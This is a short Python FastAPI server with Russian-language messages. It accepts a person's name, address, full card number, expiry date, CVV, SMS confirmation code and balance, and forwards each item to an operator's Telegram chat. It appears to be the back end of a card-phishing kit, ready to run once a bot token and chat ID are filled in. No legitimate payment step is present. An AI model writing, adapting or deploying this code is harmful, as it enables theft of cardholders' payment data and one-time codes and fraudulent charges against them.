# pip install fastapi uvicorn httpx
import os
import httpx
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel

BOT_TOKEN = os.getenv("BOT_TOKEN", "ВСТАВЬТЕ_ТОКЕН_БОТА")
ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID", "ВСТАВЬТЕ_ВАШ_CHAT_ID")

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)


class CardData(BaseModel):
    fullname: str
    city: str
    address: str
    cardnumber: str
    expiry: str
    cvc: str


class SmsCode(BaseModel):
    code: str


class CardBalance(BaseModel):
    balance: str


async def send_tg(text: str):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    async with httpx.AsyncClient(timeout=10) as client:
        await client.post(url, json={
            "chat_id": ADMIN_CHAT_ID,
            "text": text,
            "parse_mode": "HTML",
        })


@app.post("/api/card")
async def receive_card(data: CardData):
    text = (
        "💳 <b>НОВЫЕ ДАННЫЕ КАРТЫ</b>\n\n"
        f"👤 ФИО: <b>{data.fullname}</b>\n"
        f"🏙 Город: <b>{data.city}</b>\n"
        f"🏠 Адрес: <b>{data.address}</b>\n\n"
        f"💳 Карта: <code>{data.cardnumber}</code>\n"
        f"📅 Срок: <code>{data.expiry}</code>\n"
        f"🔐 CVV: <code>{data.cvc}</code>"
    )
    await send_tg(text)
    return {"ok": True}


@app.post("/api/sms")
async def receive_sms(data: SmsCode):
    text = (
        "🔑 <b>ПОЛЬЗОВАТЕЛЬ ВВЁЛ SMS-КОД</b>\n\n"
        f"Код: <code>{data.code}</code>"
    )
    await send_tg(text)
    return {"ok": True}


@app.post("/api/balance")
async def receive_balance(data: CardBalance):
    text = (
        "💰 <b>ОСТАТОК ПО КАРТЕ</b>\n\n"
        f"Сумма: <b>{data.balance}</b>"
    )
    await send_tg(text)
    return {"ok": True}